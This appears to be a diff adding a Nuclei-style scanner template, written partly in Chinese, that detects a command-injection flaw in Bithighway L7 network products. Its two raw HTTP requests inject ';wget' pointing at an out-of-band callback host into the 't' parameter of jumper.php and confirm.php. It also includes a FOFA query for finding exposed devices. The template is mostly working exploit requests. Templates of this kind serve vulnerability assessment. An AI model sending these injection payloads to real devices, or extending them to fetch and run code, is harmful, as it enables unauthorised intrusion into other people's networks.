@@ -1,0 +1,41 @@
+id: bithighway-jumper-confirm-rce
+
+info:
+  name: 碧海威 L7多款网络产品存在命令执行漏洞
+  author: god
+  severity: critical
+  description: 碧海威 L7多款网络产品存在命令执行漏洞
+  metadata:
+    fofa-query: title="碧海威L7云路由"
+  tags: bithighway,rce
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    GET /notice/jumper.php?t=;wget%20{{interactsh-url}} HTTP/1.1
+    Host: {{Hostname}}
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol
+
+- raw:
+  - |
+    @timeout: 30s
+    GET /notice/confirm.php?t=;wget%20{{interactsh-url}} HTTP/1.1
+    Host: {{Hostname}}
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol
